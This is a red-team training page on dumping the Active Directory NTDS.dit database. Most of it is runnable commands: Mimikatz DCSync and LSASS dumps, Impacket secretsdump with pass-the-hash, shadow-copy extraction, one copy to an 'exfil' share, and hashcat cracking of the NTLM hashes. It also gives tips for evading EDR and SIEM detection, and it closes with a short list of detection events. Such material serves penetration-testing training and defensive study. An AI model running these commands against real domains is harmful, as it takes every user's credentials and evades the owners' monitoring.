---
layout: training-page
title: "NTDS Dumping — Red Team Academy"
module: "Active Directory"
tags:
  - ntds
  - dcsync
  - credential-dumping
  - active-directory
  - ntlm-hashes
page_key: "ad-ntds-dumping"
render_with_liquid: false
---

# NTDS Dumping

The NTDS.dit file is the Active Directory database stored on every Domain Controller. It contains all user accounts, password hashes, and group memberships for the domain. Extracting and cracking these hashes gives an attacker full domain credentials. This page covers every reliable method to obtain NTDS.dit and the SYSTEM hive required to decrypt it.

## Required Files

```
# Both files are needed to extract hashes
NTDS.dit    — The AD database
              Default: C:\Windows\NTDS\ntds.dit
              Also at:  C:\Windows\System32\ntds.dit (distribution copy)
              Custom location: reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v "DSA Database file"

SYSTEM hive — Contains the SYSKEY used to decrypt the hashes
              Path: C:\Windows\System32\SYSTEM
```

## Method 1 — DCSync (Remote, No File Access Needed)

DCSync replicates the DC's data directly over the network using the legitimate MS-DRSR protocol. Requires membership in Administrators, Domain Admins, or Enterprise Admins — or an account with Replicating Directory Changes All / DCSync rights.

```
# Mimikatz — sync single user
mimikatz# lsadump::dcsync /domain:domain.lab /user:krbtgt

# Mimikatz — sync all users (outputs CSV)
mimikatz# lsadump::dcsync /domain:domain.lab /all /csv

# NetExec (Linux)
nxc smb 10.10.10.10 -u 'administrator' -p 'Password123' --ntds
nxc smb 10.10.10.10 -u 'administrator' -p 'Password123' --ntds drsuapi

# Impacket secretsdump (remote)
secretsdump.py domain/administrator@10.10.10.10
secretsdump.py -dc-ip 10.10.10.10 domain/administrator@10.10.10.10 -just-dc
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> -just-dc domain/dc$@10.10.10.10
```

### OPSEC Warning

```
# DCSync from a user account (not a computer account) can generate alerts:
# - Event 4662: An operation was performed on an object
#   (Replicating Directory Changes + Replicating Directory Changes All)
# - SIEM rules correlate DCSync from non-DC source IPs
# Use a compromised DC computer account when possible to blend in
```

## Method 2 — Volume Shadow Copy (VSS)

VSS allows creating point-in-time snapshots of locked files. Since NTDS.dit is always locked by the AD database service, VSS is the standard method to copy it locally.

```
# vssadmin — create shadow copy and extract files
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy\

# ntdsutil — built-in tool, creates IFM (Install From Media) package
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
# Creates: c:\temp\Active Directory\ntds.dit and c:\temp\registry\SYSTEM

# NetExec with VSS module (remote, requires admin)
nxc smb 10.10.0.202 -u username -p password --ntds vss

# Access VSS snapshot in GUI (for documentation):
# Properties → Previous Versions → find path format: @GMT-yyyy.MM.dd-HH.mm.ss
```

## Method 3 — Forensic Tools (EDR Evasion)

Using legitimate forensic tools reduces detection likelihood since they are whitelisted by many EDR products.

```
# Method A: FTK Imager (GUI)
# File → Add Evidence Item → Physical Drive → Select C:
# Navigate to Windows\NTDS\ntds.dit → Export

# Method B: DumpIT / Magnet DumpIt
# Dump full memory, then use Volatility to extract SYSTEM hive
magnet_dumpit.exe
volatility -f memory.raw windows.registry.printkey.PrintKey

# Extract SYSTEM from memory dump
volatility --profile=Win10x64_14393 dumpregistry \
  -o 0xaf0287e41000 -D output_vol -f memory.raw

# Then run secretsdump locally
secretsdump.py LOCAL \
  -system output_vol/registry.0xaf0287e41000.SYSTEM.reg \
  -ntds ntds.dit
```

## Method 4 — Remote Secretsdump

```
# Standard remote dump (requires admin creds or pass-the-hash)
secretsdump.py domain/administrator@10.10.10.10

# Using pass-the-hash
secretsdump.py -hashes :<NT_HASH> domain/administrator@10.10.10.10

# With -use-vss flag (copies ntds.dit via VSS remotely)
secretsdump.py -dc-ip 10.10.10.10 domain/administrator@10.10.10.10 -use-vss

# Show additional attributes
secretsdump.py -dc-ip IP domain/administrator@target -use-vss -pwd-last-set -user-status
# -pwd-last-set: Shows pwdLastSet timestamp for each account
# -user-status:  Shows disabled/enabled status
```

## Extracting Hashes from the Retrieved Files

```
# Local extraction (after copying ntds.dit + SYSTEM to your machine)
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL

# Output format: username:RID:LM_HASH:NT_HASH:::
# Example: administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Extract only NTLM hashes
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL | grep ":::" | cut -d: -f1,4
```

## NTDS Reversible Encryption

```
# Some accounts store passwords with reversible encryption (UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED)
# These decrypt to cleartext — look for CLEARTEXT in secretsdump output

# Find accounts with reversible encryption enabled
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Secretsdump handles these automatically — output shows CLEARTEXT: instead of hash
```

## Extract Hashes from Memory

```
# Requires admin/SYSTEM on DC
mimikatz# privilege::debug
mimikatz# sekurlsa::krbtgt
mimikatz# lsadump::lsa /inject /name:krbtgt

# Dump all cached Kerberos tickets
mimikatz# sekurlsa::tickets /export

# Dump LSASS process memory (then parse offline)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Parse with pypykatz (Linux)
pypykatz lsa minidump lsass.dmp
```

## Cracking NTLM Hashes

```
# Hashcat — NTLM cracking (mode 1000)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -w 4 -O ntlm_hashes.txt rockyou.txt -r rules/best64.rule

# Optimized for large dumps
hashcat -m 1000 -w 4 -O -a 0 ntlm_hashes.txt rockyou.txt --opencl-device-types 1,2

# Custom mask based on potfile stats
git clone https://github.com/iphelix/pack
python2 statsgen.py hashcat.potfile -o hashcat.mask
python2 maskgen.py hashcat.mask --targettime 3600 --optindex -q -o hashcat_1H.hcmask
hashcat -m 1000 ntlm_hashes.txt -a 3 hashcat_1H.hcmask

# Online crackers for CTF/challenges (not production)
# hashmob.net, crackstation.net, hashes.com
```

## AD LDS (Lightweight Directory Services) — ADAM NTDS

```
# AD LDS stores data at: C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit

# Extract via VSS
vssadmin.exe create shadow /For=C:
cp "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Program files\Microsoft ADAM\instance1\data\adamntds.dit" \
   \\exfil\data\adamntds.dit

# Extract via wbadmin backup
wbadmin.exe start backup -backupTarget:e: -vssCopy \
  -include:"C:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit"

# Recover from backup
wbadmin.exe start recovery -version:08/04/2023-12:59 \
  -items:"c:\Program Files\Microsoft ADAM\instance1\data\adamntds.dit" \
  -itemType:File -recoveryTarget:C:\Users\Administrator\Desktop\ -backupTarget:e:

# Parse with ntdissector
ntdissector path/to/adamntds.dit
python ntdissector/tools/user_to_secretsdump.py path/to/output/*.json
```

## Detection & Artifacts

```
# Key events to monitor (Windows Event Log):
# 4662 — Object operation (DCSync replication rights used)
# 4624 — Logon (DRSUAPI calls from non-DC hosts)
# 7045 — New service installed (lateral movement after hash dump)
# VSS creation: Event 8193 (VSS provider) + 4688 (vssadmin.exe process)

# Network indicators:
# MS-DRSR (DRSUAPI RPC) connections to DC from non-DC hosts
# Large LDAP queries immediately before DCSync

# File system:
# ntdsutil.exe execution
# Creation of files in C:\Windows\Temp\ with .dit extension
```

## Resources

- InternalAllTheThings NTDS Dumping — `swisskyrepo.github.io/InternalAllTheThings`
- Impacket secretsdump — `github.com/SecureAuthCorp/impacket`
- Mimikatz — `github.com/gentilkiwi/mimikatz`
- Bypassing EDR NTDS.dit Protection — `medium.com/@0xcc00/bypassing-edr-ntds-dit-protection-using-blueteam-tools`
- ntdissector — `github.com/synacktiv/ntdissector`
- Dumping Domain Password Hashes — Pentestlab — `pentestlab.blog`
